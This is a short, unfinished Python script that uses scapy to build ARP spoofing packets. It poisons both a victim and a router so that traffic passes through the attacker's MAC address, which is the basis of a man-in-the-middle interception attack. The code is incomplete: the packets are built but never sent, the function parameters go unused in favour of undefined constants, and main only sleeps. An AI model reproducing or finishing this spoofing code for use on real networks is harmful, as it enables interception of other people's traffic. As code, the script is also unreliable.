#!/usr/bin/python

import ConfigParser, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def readConfig():
    config = ConfigParser.ConfigParser()
    config.read('arp.config')
    # ourMac = config.get('ARP','ourmac')
    # print mac
    for option, value in config.items('ARP'):
    	print option, value

def arpSpoof(routerIP, routerMAC, victimIP, victimMAC):
    arpPacketVictim = Ether(src=OUR_MAC_ADDR, dst=VICTIM_MAC_ADDR)/ARP(hwsrc=OUR_MAC_ADDR, 
                                hwdst=VICTIM_MAC_ADDR, psrc=ROUTER_IP, pdst=VICTIM_IP, op=2)

    arpPacketRouter = Ether(src=OUR_MAC_ADDR, dst=ROUTER_MAC_ADDR)/ARP(hwsrc=OUR_MAC_ADDR, 
                                hwdst=ROUTER_MAC_ADDR, psrc=VICTIM_IP, pdst=ROUTER_IP, op=2)


def main():
    time.sleep(2)
